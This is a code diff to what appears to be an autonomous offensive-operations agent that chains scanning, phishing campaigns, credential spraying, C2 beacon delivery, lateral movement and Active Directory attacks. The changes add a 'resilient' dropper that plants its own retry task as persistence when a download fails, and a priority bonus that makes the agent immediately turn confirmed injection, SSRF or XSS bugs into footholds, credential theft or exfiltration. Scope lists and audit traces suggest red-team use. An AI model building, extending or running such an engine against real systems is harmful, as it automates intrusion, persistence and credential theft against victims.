@@ -44,6 +44,11 @@ from phantom.automation.ad_awareness import ADAwareness
 from phantom.core.executor import execute_quiet
 from phantom.core.safe_exec import unsafe_slot_reason
 
+# Bump when a checkpoint field changes MEANING (not when one is added):
+# from_state reads every field defensively, so a mismatch is a warning to
+# the operator, never a hard failure.
+CHECKPOINT_SCHEMA = 1
+
 # Deep mode: the goal string that runs the full engagement ladder back-to-
 # back in ONE run instead of stopping at the first terminal goal. Each stage
 # is a normal planner goal; a stage ends when its own goal facts exist (or
@@ -67,14 +72,25 @@ DEEP_STAGES = ("deliver", "post_exploit", "expand", "ad", "crack", "lateral")
 # analysis says which STRATEGY class is still worth trying; this maps that
 # back to the concrete moves, so a stall recovery can re-arm the useful ones
 # first instead of iterating a dict in insertion order.
+# Gap class -> the capability families worth re-arming, best first. Two
+# entries named capabilities that DO NOT EXIST ("smb_login"/"cred_dump"
+# for credential acquisition, "phish"/"dm_stage1" for the identity
+# delivery path): the mapping silently degraded to an arbitrary re-arm
+# order for those gaps, which looks identical to a working priority. The
+# suite now pins every id here against the real registry, because a name
+# that matches nothing is worse than no hint at all.
 _GAP_CAP_HINTS = {
     "network_beacon": ("beacon_deploy", "lateral_pivot", "smb_pivot",
                        "winrm_pivot"),
-    "network_creds": ("ssh_login", "smb_login", "web_creds", "cred_dump"),
+    "network_creds": ("ssh_login", "web_creds", "cred_spray",
+                      "breach_check"),
     "exploit_chain": ("service_exploit", "web_rce", "http_probe"),
     "network_footprint": ("scan_tcp", "version_detect", "surface_map"),
     "identity_breach": ("breach_check", "osint_identity"),
-    "identity_phish": ("phish", "dm_stage1"),
+    "identity_phish": ("phish_identity", "campaign_launch", "dm_launch",
+                       "poll_hits"),
+    "identity_beacon": ("phish_identity", "dm_stage2", "poll_hits",
+                        "harvest_campaign"),
     "identity_osint": ("osint_identity", "profile_recon"),
 }
 
@@ -344,7 +360,8 @@ class AutonomousAgent:
                  reason_profile: str = "",
                  cell_loop: bool = False,
                  cell_stages: Optional[List[str]] = None,
-                 evolution_mode: str = "code") -> None:
+                 evolution_mode: str = "code",
+                 resilient_stager: bool = True) -> None:
         self.target = target
         if target_type in ("", "auto"):
             from phantom.automation.guidance.targets import classify_target
@@ -356,6 +373,10 @@ class AutonomousAgent:
         self.paranoid = paranoid
         self.speed = speed
         self.reason_profile = reason_profile
+        # resilient stager is INDEPENDENT of paranoid: a delivery that only
+        # works when the C2 happens to be up is a one-shot gamble. Opting out
+        # is explicit (`--no-resilient`), never a side effect of max-OPSEC.
+        self.resilient_stager = resilient_stager
         self.scope_list = scope_list or []
         # target ledger: the single source of truth for the ACTIVE target
         # set (initial + mid-run pivots), their classification, and the
@@ -405,6 +426,13 @@ class AutonomousAgent:
             explicit=reason_profile)
         self.arbiter = Arbitrator(self.reasoning_profile)
         self._decisions: Dict[str, Any] = {}
+        # DECISION TRACE (7.5): `_decisions` keeps only the last verdict per
+        # capability and dies with the process. The trace keeps the ORDERED
+        # history — which lens made each call, in which stage — survives a
+        # checkpoint, and is what the report and `--verbose` show, so the
+        # arbiter's choices are auditable instead of merely plausible.
+        from phantom.automation.brain.trace import DecisionTrace
+        self.trace = DecisionTrace()
         self._last_stall: str = ""
         self._current_stage: str = ""
         self._last_failed_cap: Any = None
@@ -428,9 +456,12 @@ class AutonomousAgent:
         # situation, the technique's OUTCOME, WHY it failed and which move
         # unblocked it, so a wall hit earlier is not hit the same way again.
         # Like the priors it only REORDERS moves that already passed every
-        # gate — it can never authorise anything. Default is
-        # engagement-scoped: nothing is written to disk unless the operator
-        # opts into cross-engagement memory (`--experience`).
+        # gate — it can never authorise anything.
+        # `experience=True` means the memory PERSISTS across engagements
+        # (data/experience_cases.json, local disk only); False keeps it
+        # engagement-scoped (run-only, nothing on disk). The entry points
+        # resolve the operator's intent via automation.experience
+        # (default true) / --no-experience and pass the resolved value here.
         self.experience = _make_experience(experience)
         self.planner.experience = self.experience
         self.runtime = runtime or StealthRuntime(self.stealth_engine)
@@ -452,6 +483,11 @@ class AutonomousAgent:
         # spinning forever.
         self._fail_notes: Dict[tuple, int] = {}
         self._poisoned: set = set()
+        # Explicit `unblock` condition per failed capability: what NEW facts
+        # would make this move viable again, in plain words. This is the
+        # auditable answer to "why is this dead, and what revives it" — the
+        # operator no longer has to infer it from the failure reason.
+        self._unblock_conditions: Dict[str, str] = {}
         self._recoveries = 0
         self._max_recoveries = 3
         self._session: Optional["_BeaconSession"] = None
@@ -563,6 +599,14 @@ class AutonomousAgent:
                 continue
 
     def _emit(self, kind: str, **data) -> None:
+        # a blocked/failed event carries the explicit unblock condition when
+        # one is known, so the decision stream answers "what would revive
+        # this move" instead of leaving the operator to guess
+        cap_id = data.get("capability")
+        if cap_id and kind in ("blocked", "failed"):
+            cond = self._unblock_conditions.get(cap_id)
+            if cond:
+                data.setdefault("unblock", cond)
         self.sink.emit(kind, **data)
         if self._on_event:
             try:
@@ -853,6 +897,29 @@ class AutonomousAgent:
         self._edge_resolved = True
         self._run_origin_discovery()
 
+    def _stamp_tool_choice(self, cap) -> None:
+        """Record the TARGET-AWARE tool choice for this capability.
+
+        Sets ``wm.chosen_tool`` so the ``kit._chosen_tool`` adapters route
+        on it: the emitted command then fits the target's real surface
+        rather than the hard-coded default. A target with no SMB surface
+        yields ``tool=None`` for ``smb_enum`` (the adapter keeps its
+        default) but the choice and its reason are RECORDED, so aiming a
+        tool at an absent surface is auditable instead of silent. Never
+        fatal: a belt failure leaves the adapter on its default.
+        """
+        from phantom.automation.brain.toolbelt import Toolbelt
+        belt = getattr(self, "_toolbelt", None)
+        if belt is None:
+            belt = Toolbelt(getattr(self, "toolchain", None))
+            self._toolbelt = belt
+        surface = belt.surface_from_wm(self.wm)
+        choice = belt.pick(cap.id,
+                           style=getattr(self.wm, "scan_style", "balanced"),
+                           target=surface)
+        self.wm.chosen_tool = {"capability": cap.id, "tool": choice.tool,
+                               "reason": choice.reason}
+
     def _execute_capability(self, step: PlanStep) -> bool:
         cap = step.capability
         slots = dict(step.slot_values)
@@ -899,8 +966,16 @@ class AutonomousAgent:
                         self._emit("deferred", capability=cap.id,
                                    reason="precondition not met")
                         return False
-                except Exception:
-                    pass
+                except Exception as exc:
+                    # A precondition that RAISES must never be read as
+                    # "satisfied": that turns a bug (or a hostile fact) into
+                    # an authorization bypass. A precondition only opens a
+                    # door by RETURNING True — anything else is a deferral.
+                    self._emit("deferred", capability=cap.id,
+                               reason=f"precondition error: {exc}")
+                    self.wm.record_failure(
+                        cap.id, f"precondition raised: {exc}")
+                    return False
         # toolchain: a capability whose tools are missing fails cleanly
         # (checked BEFORE autofill so no side effects are recorded)
         if cap.tools and self.toolchain.resolve(cap.tools) is None:
@@ -913,6 +988,12 @@ class AutonomousAgent:
             self._emit("tool_missing", capability=cap.id, tools=missing)
             self.wm.record_failure(cap.id, f"tool unavailable: {', '.join(missing)}")
             return False
+        # TOOL CHOICE: stamp the target-aware pick BEFORE autofill/adapter,
+        # so the command is built for THIS target's surface.
+        try:
+            self._stamp_tool_choice(cap)
+        except Exception:
+            pass
         # senior red-teamer behavior: fill in what the plan didn't specify
         try:
             slots = self._autofill_slots(cap, slots)
@@ -965,7 +1046,15 @@ class AutonomousAgent:
         # probes against the discovered web services) — the adapter returns
         # WEBCREDS: markers, never a shell command
         if cap.id == "web_creds":
-            return self._execute_web_creds_capability(cap, slots)        # A-2: a LEARNED capability carries NO in-process adapter/interpreter
+            return self._execute_web_creds_capability(cap, slots)
+        # in-process ENGINE capabilities run HERE, not in make_command:
+        # building a command must stay pure (the chain preview builds every
+        # candidate's command, and a live socket probe there is a bug), and
+        # `run_engine` gives the engine a timeout and a short TTL cache.
+        if getattr(cap, "exec_class", "") == "in_process_engine" \
+                and getattr(cap, "engine", None) is not None:
+            return self._execute_engine_capability(cap, slots)
+        # A-2: a LEARNED capability carries NO in-process adapter/interpreter
         # (the loader reads only an out-of-process descriptor). Its whole
         # contribution — preconditions, adapter and interpreter — runs in the
         # task worker, and findings come back as JSON data. This must be
@@ -1255,11 +1344,23 @@ class AutonomousAgent:
         new = False
         for f in findings:
             prev = known.get((f.kind, f.key))
+            stored = self.wm.add_finding(f.kind, f.key, f.value,
+                                         confidence=f.confidence, source=cap_id,
+                                         evidence=f.evidence)
+            if stored.value != f.value:
+                # belief revision REFUSED this value: what we already hold
+                # is stronger. That is not a new fact (the planner must not
+                # move on it), and it has no other operator-visible trace
+                # (an accepted value shows up as a normal `found`), so it
+                # is announced here instead of vanishing.
+                self._emit("contradiction", capability=cap_id,
+                           finding=f"{f.kind}:{f.key}",
+                           value=_safe_stream_value(f),
+                           stored=_safe_stream_value(stored),
+                           confidence=stored.confidence)
+                continue
             if prev is None or prev.value != f.value:
                 new = True
-            self.wm.add_finding(f.kind, f.key, f.value,
-                                confidence=f.confidence, source=cap_id,
-                                evidence=f.evidence)
             # internal recon discoveries join the target ledger so pivot
             # selection can authorize them. They are registered under the
             # NORMAL scope rule (NOT scope-inherited): an ARP neighbor is
@@ -1325,6 +1426,38 @@ class AutonomousAgent:
             return lines[-1][:120]
         return "ran clean but produced no findings"
 
+    def _precondition_facts(self, cap) -> set:
+        """The fact kinds a capability needs: its precondition functions
+        PLUS its declarative `requires` grammar. One source so the retry
+        gate and the unblock condition can never disagree."""
+        kinds: set = set()
+        for pre in getattr(cap, "preconditions", []) or []:
+            try:
+                kinds.update(Planner._precondition_facts(pre))
+            except Exception:
+                pass
+        for req in getattr(cap, "requires", []) or []:
+            kind = str(req).split(":", 1)[0].strip()
+            if kind:
+                kinds.add(kind)
+        return kinds
+
+    def _unblock_condition_for(self, cap) -> str:
+        """What would make this failed capability viable again, in words.
+
+        The fact kinds it needs that the world does not hold yet. Empty
+        when the move is self-sufficient (nothing would revive it) — that
+        emptiness is itself the answer: a dead end, not a waiting move.
+        """
+        if cap is None:
+            return ""
+        kinds = self._precondition_facts(cap)
+        missing = sorted(k for k in kinds
+                         if not self.wm.has_any(k))
+        if not missing:
+            return ""
+        return "new " + " / ".join(missing)
+
     def _mark_failed(self, capability_id: str) -> None:
         """A capability is dead from now on — unless the world changes."""
         try:
@@ -1332,12 +1465,23 @@ class AutonomousAgent:
         except Exception:
             self._last_failed_cap = None
         self._failed_caps[capability_id] = time.time()
+        # explicit unblock condition (P1): computed once here and attached
+        # to the failure record + emitted on the blocked/failed event
+        unblock = self._unblock_condition_for(self._last_failed_cap)
+        if unblock:
+            self._unblock_conditions[capability_id] = unblock
+        else:
+            self._unblock_conditions.pop(capability_id, None)
         note = ""
         for f in reversed(self.wm.failures):
             if f.get("capability") == capability_id:
                 note = f.get("reason", "")
                 break
         self._last_fail_reason[capability_id] = note
+        for f in reversed(self.wm.failures):
+            if f.get("capability") == capability_id:
+                f.setdefault("unblock", unblock)
+                break
         key = (capability_id, note)
         count = self._fail_notes.get(key, 0) + 1
         self._fail_notes[key] = count
@@ -1380,9 +1524,11 @@ class AutonomousAgent:
                 if same_failures >= 2:
                     return False
                 break
-        fact_kinds: set = set()
-        for pre in cap.preconditions:
-            fact_kinds.update(Planner._precondition_facts(pre))
+        # the SAME derivation the unblock condition reports: a declarative
+        # `requires` capability re-arms on the same facts a functional
+        # precondition would (they used to diverge — a requires-only move
+        # could never become retry-eligible)
+        fact_kinds = self._precondition_facts(cap)
         if not fact_kinds:
             return False
         return any(f.ts > failed_at for kind in fact_kinds
@@ -1575,15 +1721,24 @@ class AutonomousAgent:
         return {"ssh": 22, "smb": 445, "ftp": 21, "winrm": 5985,
                 "http": 80, "tomcat": 8080, "mysql": 3306,
                 "postgresql": 5432}.get(service, 443)
+    def _target_platform_answer(self):
+        """The artefact family for this target, and HOW WE KNOW (8.3).
+
+        The classification belongs to `utils.target_platform` — the ONE
+        source shared with the payload module, the C2 shell and the network
+        map. This method used to be a third private sniff over the same OS
+        string (`"windows" in x or "win" in x`), which is how the agent and
+        the manual `generate` flow could disagree about the same host.
+        """
+        from phantom.utils.target_platform import assumed_linux, from_findings
+        answer = from_findings(self.wm, source="target os finding")
+        if answer.known:
+            return answer
+        return assumed_linux("no os finding")
+
     def _target_platform(self) -> str:
-        """Platform comes from the OS finding (like the manual `generate`
-        flow picks the dropper). Default: linux — the beacon for the target
-        OS is compiled on demand by the SAME builder the C2 shell uses."""
-        from phantom.automation.guidance.kit import _target_os as _target_os_name
-        os_name = _target_os_name(self.wm).lower()
-        if "windows" in os_name or "win" in os_name:
-            return "windows"
-        return "linux"
+        """Platform name (see `_target_platform_answer` for the source)."""
+        return self._target_platform_answer().platform
 
     def _default_beacon_builder(self, platform: str, c2_host: str,
                                 c2_port: int) -> Optional[str]:
@@ -1616,7 +1771,17 @@ class AutonomousAgent:
         through that channel."""
         from phantom.utils.network import get_c2_endpoint
         c2_host, c2_port = get_c2_endpoint()
-        platform = self._target_platform()
+        answer = self._target_platform_answer()
+        platform = answer.platform
+        if not answer.known:
+            # the artefact family is the one thing that cannot be guessed:
+            # an unidentified host gets the Linux default, and the operator
+            # is TOLD (a silent default shipped an ELF to Windows before)
+            self._emit("note", capability="beacon_build",
+                       detail="target OS not identified: deploying the "
+                              "linux artefact — run os_detect (or re-run "
+                              "with the right profile) if the host is "
+                              "Windows/macOS")
         binary = self._beacon_builder(platform, c2_host, c2_port)
         if not binary:
             raise ValueError(
@@ -1624,9 +1789,26 @@ class AutonomousAgent:
                 "(toolchain missing on the operator host?)")
         self._last_beacon_binary = binary
         from phantom.utils.builder import generate_dropper
-        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True)
+        # RESILIENT stager (8.1, option C): a single failed download used to
+        # end the delivery. The stager tries once, then schedules its own
+        # retry WITH the endpoint already embedded, so the second attempt
+        # does not depend on the operator or on the channel still being
+        # open. It is ON regardless of paranoid — max-OPSEC losing the whole
+        # engagement to one failed fetch is not a trade worth making. The
+        # retry artefact is persistence, so `--no-resilient` is the explicit
+        # opt-out and the artefact names are deterministic for cleanup.
+        resilient = getattr(self, "resilient_stager", True)
+        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
+                                   resilient=resilient)
         if not dropper:
             raise ValueError(f"no dropper defined for platform {platform}")
+        self._emit("note", capability="stager",
+                   detail=("resilient stager: a failed download schedules "
+                           "its own retry with the endpoint embedded "
+                           "(cleanup artefact: the retry task/script)"
+                           if resilient else
+                           "one-shot stager (--no-resilient: no retry "
+                           "scheduled)"))
         return dropper
 
     def _ssh_creds_ok(self, user: str, pw: str) -> bool:
@@ -1982,6 +2164,37 @@ class AutonomousAgent:
             self._emit("failed", capability=cap.id, output="no IDOR signals")
             return False
         output = "\n".join(s.to_marker() for s in signals)
+        findings = cap.interpret(output, self.wm, slots)
+        learned = self._register_findings(cap.id, findings)
+        self._emit_found(cap.id, findings)
+        if not learned:
+            self._mark_failed(cap.id)
+            self.wm.record_failure(cap.id, "no new facts learned")
+            return False
+        return True
+
+    def _execute_engine_capability(self, cap, slots: Dict[str, Any]) -> bool:
+        """Run an in-process engine capability.
+
+        The engine opens sockets/does the I/O at EXECUTION time only, under
+        a timeout, with its markers cached for the run; the interpreter
+        turns them into findings. Command synthesis is never involved, so a
+        preview of a chain containing this capability touches nothing.
+        """
+        from phantom.automation.guidance.commands import run_engine
+        self._emit("run", capability=cap.id, banner=cap.banner,
+                   category=cap.category, cost=cap.opsec_cost)
+        try:
+            output = run_engine(cap, self.wm, slots)
+        except Exception as e:
+            self.wm.record_action(cap.id, slots, f"engine://{cap.id}",
+                                  ok=False, note=str(e))
+            self.wm.record_failure(cap.id, str(e))
+            self._mark_failed(cap.id)
+            self._emit("failed", capability=cap.id, output=str(e)[:300])
+            return False
+        self.wm.record_action(cap.id, slots, f"engine://{cap.id}", ok=True,
+                              note=f"{len(output)} bytes")
         findings = cap.interpret(output, self.wm, slots)
         learned = self._register_findings(cap.id, findings)
         self._emit_found(cap.id, findings)
@@ -2625,7 +2838,7 @@ class AutonomousAgent:
         """Serialize the full agent state (world model + run discipline) to
         a JSON checkpoint for campaign resume after a restart."""
         state = {
-            "schema": 1,
+            "schema": CHECKPOINT_SCHEMA,
             "target": self.target,
             "target_type": self.target_type,
             "profile": self.profile,
@@ -2634,8 +2847,17 @@ class AutonomousAgent:
             "paranoid": self.paranoid,
             "speed": self.speed,
             "goal": self.goal,
+            # the REASONING objective is an operator decision (`--reason`),
+            # and the cell authority decides which stage the roster owns.
+            # Both used to be dropped at the checkpoint: a resumed run
+            # silently re-chose its reasoning profile and lost the cell
+            # migration it was configured with.
+            "reason_profile": self.reason_profile,
+            "cell_loop": bool(self.cell_loop),
+            "cell_stages": list(self.cell_stages),
             "failed_caps": dict(self._failed_caps),
             "wm": self.wm.to_dict(),
+            "trace": self.trace.to_dict(),
             "saved_at": time.time(),
         }
         path = os.path.abspath(path)
@@ -2659,13 +2881,30 @@ class AutonomousAgent:
                    trojan_assets: Optional[Dict[str, str]] = None,
                    command_seed: int = 0,
                    hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
-                   hunt_delay: Optional[float] = None) -> "AutonomousAgent":
+                   hunt_delay: Optional[float] = None,
+                   resilient_stager: bool = True) -> "AutonomousAgent":
         """Rebuild an agent from a checkpoint: the world model (findings,
         hypotheses, opsec ledger, identity graph) and the run discipline
         (dead capabilities) are restored exactly as they were."""
         import json
         with open(path, "r", encoding="utf-8") as f:
             state = json.load(f)
+        # CHECKPOINT SCHEMA GATE: a checkpoint from another build is still
+        # read (best effort), but the operator is TOLD instead of silently
+        # resuming with defaults for whatever field moved — the resume path
+        # once dropped reason_profile/cell_stages without a word.
+        state_schema = state.get("schema")
+        if state_schema != CHECKPOINT_SCHEMA:
+            try:
+                if on_event is not None:
+                    on_event("note", {
+                        "capability": "resume",
+                        "detail": (f"checkpoint schema {state_schema!r} != "
+                                   f"{CHECKPOINT_SCHEMA}: resuming, but "
+                                   "fields that changed between builds use "
+                                   "their defaults")})
+            except Exception:
+                pass
         agent = cls(
             target=state.get("target", ""),
             target_type=state.get("target_type", "auto"),
@@ -2674,6 +2913,10 @@ class AutonomousAgent:
             stealth=bool(state.get("stealth", True)),
             paranoid=bool(state.get("paranoid", False)),
             speed=bool(state.get("speed", False)),
+            reason_profile=state.get("reason_profile", "") or "",
+            resilient_stager=resilient_stager,
+            cell_loop=bool(state.get("cell_loop", False)),
+            cell_stages=list(state.get("cell_stages") or []),
             on_event=on_event,
             scope_list=scope_list,
             toolchain=toolchain,
@@ -2694,6 +2937,10 @@ class AutonomousAgent:
                 cost_per_action=0.5,
                 governor=TimingGovernor(base_delay=0.0, jitter=0.0))
         agent.wm = WorldModel.from_dict(state.get("wm", {}))
+        # a resumed run keeps its decisions: the report of the second half
+        # must explain the first, or the trace is only half an audit
+        from phantom.automation.brain.trace import DecisionTrace
+        agent.trace = DecisionTrace.from_dict(state.get("trace"))
         agent._failed_caps = {
             cid: float(ts) for cid, ts in state.get("failed_caps", {}).items()}
         agent.goal = state.get("goal")
@@ -2738,8 +2985,9 @@ class AutonomousAgent:
                        reason=verdict.reason,
                        strategies=list(verdict.strategies),
                        policy=self.search_policy())
-        except Exception:
+        except Exception as exc:      # no diagnosis class = say so, not nothing
             self._last_stall = ""
+            self._degrade("stall", exc)
         # C2: the stalled cell is escalated (an ADVISORY peer when the role
         # touches the target, so the second opinion costs no noise) and the
         # peer gets to rate the same candidate set with its own objective.
@@ -2749,8 +2997,8 @@ class AutonomousAgent:
                                     getattr(self, "_last_failed_cap", None),
                                     self._current_stage)
             self._second_opinion(goal)
-        except Exception:
-            pass
+        except Exception as exc:      # the second opinion is a layer too
+            self._degrade("second_opinion", exc)
 
         # Beacon-goal coverage gap: the default scan_tcp is top-ports only,
         # so non-standard management/backdoor ports (2222, 22222, 8081-class
@@ -2819,17 +3067,35 @@ class AutonomousAgent:
         # and then ignored, because the learned signal never reached a
         # decision. Order the re-arm by it, so the recovery spends its
         # budget on the angle that actually serves the MISSING fact.
+        # 7.6 thin-surface policy: on a surface where enumeration found
+        # almost nothing, the PROFILE decides which families the recovery
+        # reaches for first (deepen the one service / identity+MDM / the
+        # control plane) instead of the generic list defaulting a machine
+        # class into active OSINT/phishing. Ordering, not exclusion — and
+        # when the surface is NOT thin the learned gap analysis leads, as
+        # before.
+        thin = ""
+        thin_caps: tuple = ()
+        try:
+            from phantom.automation.guidance.strategy import (
+                surface_is_thin, thin_surface_caps)
+            from phantom.automation.swarm.profile_policy import thin_surface_for
+            if surface_is_thin(self.wm):
+                thin = thin_surface_for(self.profile)
+                thin_caps = thin_surface_caps(thin)
+        except Exception as exc:
+            self._degrade("thin_surface", exc)
         gap = ""
         try:
             gap = self._fallback.next_strategy(
                 getattr(self, "_current_strategy", "") or "", self.wm) or ""
         except Exception as exc:
             self._degrade("fallback", exc)
-        hints = tuple(_GAP_CAP_HINTS.get(gap, ()))
-        if gap:
+        hints = thin_caps or tuple(_GAP_CAP_HINTS.get(gap, ()))
+        if gap or thin:
             self._emit("gap", goal=goal, missing=gap,
                        hints=list(hints[:4]), failed=len(self._failed_caps),
-                       stall=self._last_stall)
+                       stall=self._last_stall, policy=thin)
         candidates = sorted(
             self._failed_caps,
             key=lambda cid: ((hints.index(cid) if cid in hints else len(hints)),
@@ -2997,6 +3263,8 @@ class AutonomousAgent:
                 self._emit("note", capability="experience",
                            detail=(f"{exp_result['promoted']} pattern(s) "
                                    "promoted into the global priors"))
+            self._emit("learning_receipt",
+                       detail=experience_receipt(self.experience))
         except Exception:
             pass
         # self-improvement loop (opt-in): stable uncovered failure patterns
@@ -3202,7 +3470,15 @@ class AutonomousAgent:
                 # agent keeps probing alternate angles toward the beacon
                 if self._recover_stall(goal):
                     continue
-                self._emit("halt", reason=plan.blocked_reason or "no plan")
+                # WHY it halted: the planner's rejections carry the concrete
+                # reason per candidate (stealth-gated for this profile, tool
+                # missing, already failed with no new facts, needs a fact
+                # that can no longer be produced). The operator used to get
+                # "no affordable path to goal" and nothing else.
+                rejections = [r.to_dict() for r in plan.rejected][:8]
+                self._emit("halt", reason=plan.blocked_reason or "no plan",
+                           goal=goal, rejected=rejections,
+                           rejected_total=len(plan.rejected))
                 return False
             # submit the plan (cheapest-first order), skipping failed caps
             # unless new facts make them viable again. Only steps whose
@@ -3227,8 +3503,17 @@ class AutonomousAgent:
                 # rather than giving up before the beacon is injected
                 if self._recover_stall(goal):
                     continue
-                self._emit("halt", reason="no new move available "
-                                          "(all failed capabilities are stale)")
+                rejected = [r.to_dict() for r in plan.rejected][:8]
+                # name the moves that were stale, so "no new move" is not a
+                # mystery: these are the capabilities whose retry is blocked
+                stale = [s.capability.id for s in plan.steps
+                         if not self._retry_eligible(s.capability)][:6]
+                self._emit("halt",
+                           reason="no new move available "
+                                  "(all failed capabilities are stale)",
+                           goal=goal, rejected=rejected,
+                           rejected_total=len(plan.rejected),
+                           stale=stale)
                 return False
             # hunt_web can legitimately run ~60-90s (bounded probe
             # budget); a 120s drain timeout would cut it mid-run and
@@ -3302,7 +3587,8 @@ class AutonomousAgent:
         try:
             resolved = self.reasoning.resolve(
                 self.wm, failed_cap_ids=self._failed_caps)
-        except Exception:
+        except Exception as exc:      # the reasoning layer must not die mute
+            self._degrade("hypotheses", exc)
             return []
         if resolved:
             self._emit("hypothesis", resolved=resolved)
@@ -3352,6 +3638,14 @@ class AutonomousAgent:
                            open_hypothesis_caps=self._open_hypothesis_caps())
             decision = self.arbiter.evaluate(view, base, self._signals())
             self._decisions[view.id] = decision
+            # the ledger keeps CHANGES: re-planning the same move the same
+            # way is not a new decision, and would bury the history
+            entry = self.trace.note(
+                decision, stage=self._current_stage or (self.goal or ""))
+            if entry is not None:
+                self._emit("decision", capability=view.id,
+                           detail=entry.explain(), driver=entry.driver,
+                           stage=entry.stage, seq=entry.seq)
             return decision.value
         except Exception as exc:      # a broken lens must not be silent
             self._degrade("arbiter", exc)
@@ -3532,6 +3826,40 @@ class AutonomousAgent:
         except Exception:
             return ""
 
+    def _payoff_bonus(self, step: PlanStep) -> float:
+        """Convert a CONFIRMED bug into its PAYOFF before anything else.
+
+        A confirmed code-execution or session primitive is the most
+        valuable fact an engagement holds and it is worth NOTHING until
+        the move that discharges it runs. Without this the planner can
+        confirm a command injection and then wander off to re-scan — the
+        finding sits unconsumed. The bonus makes the payoff move win while
+        the primitive is unconsumed, and it disappears the moment the
+        payoff finding exists (so the run does not loop on it).
+        """
+        effects = set(step.capability.effects or [])
+        payoffs_by_class = {
+            "cmdi": ("rce_foothold",), "ssti": ("rce_foothold",),
+            "deser": ("rce_foothold",), "ssrf": ("cloud_creds",),
+            "traversal": ("file_read",), "sqli": ("creds",),
+            "xss": ("xss_exfil",),
+        }
+        try:
+            already = {kind for kind in
+                       ("rce_foothold", "cloud_creds", "creds",
+                        "file_read", "xss_exfil")
+                       if self.wm.find(kind)}
+            for f in self.wm.find("hunt_anomaly"):
+                v = f.value if isinstance(f.value, dict) else {}
+                if not v.get("confirmed"):
+                    continue
+                for payoff in payoffs_by_class.get(str(v.get("cls") or ""), ()):
+                    if payoff in effects and payoff not in already:
+                        return 8.0
+        except Exception:
+            return 0.0
+        return 0.0
+
     def _priority(self, step: PlanStep) -> float:
         # expected value heuristic: cheap + low detection wins
         # KILL-CHAIN ORDER: before any service is known, the footprint scan
@@ -3560,6 +3888,9 @@ class AutonomousAgent:
                 pass
         if step.capability.category == "post":
             priority -= 10.0  # post-exploitation ALWAYS runs after the beacon
+        # reasoning -> action: a confirmed-but-unconsumed bug outranks
+        # ordinary moves, so the run weaponizes what it already proved
+        priority += self._payoff_bonus(step)
         # R1/R2: state-dependent arbitration on top of the expected value
         return self._decision_for(step, priority)
 
@@ -3669,12 +4000,65 @@ def _engine_commit() -> str:
 def _make_experience(enabled: bool):
     """Build the case-based experience memory (see brain/experience).
 
-    `enabled=True` means GLOBAL/cross-engagement persistence; False keeps
-    the memory inside the current engagement (in memory only), so no
-    client's data is ever written to disk unless the operator opts in.
+    `enabled=True` means GLOBAL/cross-engagement persistence (the run
+    records episodes into data/experience_cases.json on the operator's
+    own disk); False keeps the memory inside the current engagement
+    (in memory only). Entry points resolve the operator's choice via
+    config `automation.experience` (default true) / --no-experience and
+    pass the RESOLVED value here, so the planner can never read unset.
     """
     from phantom.automation.brain.experience import Experience
     return Experience(enabled=bool(enabled))
+
+
+def experience_receipt(store) -> str:
+    """One-line end-of-run learning receipt from an Experience (or a bare
+    CaseStore).
+
+    Names what the run recorded, what the next run will do differently,
+    and where the memory lives — the visible proof the engine learns.
+    """
+    stats = store.stats()
+    run = stats.get("run") or {}
+    run_state = getattr(store, "_run", None)
+    eps_list = (list(run_state.episodes) if run_state is not None
+                else list(getattr(store, "episodes", []) or []))
+    eps = len(eps_list) if run_state is not None \
+        else int(run.get("episodes", len(eps_list)) or 0)
+    repairs = int(run.get("repairs_learned",
+                          sum(1 for e in eps_list
+                              if getattr(e, "repair", ""))) or 0)
+    pattern = ""
+    try:
+        for ep in sorted(eps_list, key=lambda e: getattr(e, "ts", 0.0),
+                         reverse=True):
+            if getattr(ep, "ok", True) or not getattr(ep, "repair", ""):
+                continue
+            pattern = (f"'wall {ep.technique} -> {ep.cause} was unblocked "
+                       f"by {ep.repair}'")
+            break
+    except Exception:
+        pattern = ""
+    where = ("global memory " + str(stats.get("path", ""))
+             if stats.get("enabled") else "run-only memory (not on disk)")
+    if not eps:
+        return ("Learning receipt: 0 episodes this run — nothing to "
+                f"remember yet ({where}).")
+    parts = [f"Learning receipt: {eps} episode(s) recorded",
+             f"{repairs} unblock(s) learned"]
+    if pattern:
+        parts.append(f"next run reorders around {pattern}")
+    return " — ".join(parts) + f" ({where})."
+
+
+def _learning_receipt(agent) -> Optional[str]:
+    """The receipt line for the end-of-run notifier call, or None."""
+    try:
+        if agent.experience is None:
+            return None
+        return experience_receipt(agent.experience)
+    except Exception:
+        return None
 
 
 def _run_target_with_workers(target: str, profile: str, aggressive: bool,
@@ -3698,6 +4082,7 @@ def _run_target_with_workers(target: str, profile: str, aggressive: bool,
                              stop_event=None,
                              seed_findings=None,
                              reason_profile: str = "",
+                             resilient_stager: bool = True,
                              cell_loop: bool = False,
                              cell_stages: Optional[List[str]] = None,
                              evolution_mode: str = "code") -> tuple:
@@ -3743,6 +4128,7 @@ def _run_target_with_workers(target: str, profile: str, aggressive: bool,
             threat_intel=threat_intel, persist_learning=persist_learning,
             experience=experience, evolution=evolution, llm=llm,
             stop_event=stop_event, reason_profile=reason_profile,
+            resilient_stager=resilient_stager,
             cell_loop=cell_loop, cell_stages=cell_stages,
             evolution_mode=evolution_mode)
         if runner is not None:
@@ -3825,6 +4211,7 @@ def run_autonomous(target: str, target_type: str = "auto",
                    seed_findings: Optional[List[Dict[str, Any]]] = None,
                    stop_event=None,
                    reason_profile: str = "",
+                   resilient_stager: bool = True,
                    cell_loop: bool = False,
                    cell_stages: Optional[List[str]] = None,
                    evolution_mode: str = "code"):
@@ -3854,7 +4241,7 @@ def run_autonomous(target: str, target_type: str = "auto",
             share=share, beacon_builder=beacon_builder,
             social_engine=social_engine, trojan_assets=trojan_assets,
             command_seed=command_seed, hunt_runner=hunt_runner,
-            hunt_delay=hunt_delay)
+            hunt_delay=hunt_delay, resilient_stager=resilient_stager)
         agent.enterprise = EnterpriseBrain(agent.profile,
                                            threat_intel=threat_intel)
         agent.persist_learning = persist_learning
@@ -3895,6 +4282,7 @@ def run_autonomous(target: str, target_type: str = "auto",
             llm=llm,
             stop_event=stop_event, seed_findings=seed_findings,
             reason_profile=reason_profile,
+            resilient_stager=resilient_stager,
             cell_loop=cell_loop, cell_stages=cell_stages,
             evolution_mode=evolution_mode)
         if return_agent:
@@ -3919,6 +4307,7 @@ def run_autonomous(target: str, target_type: str = "auto",
                             llm=llm,
                             stop_event=stop_event,
                             reason_profile=reason_profile,
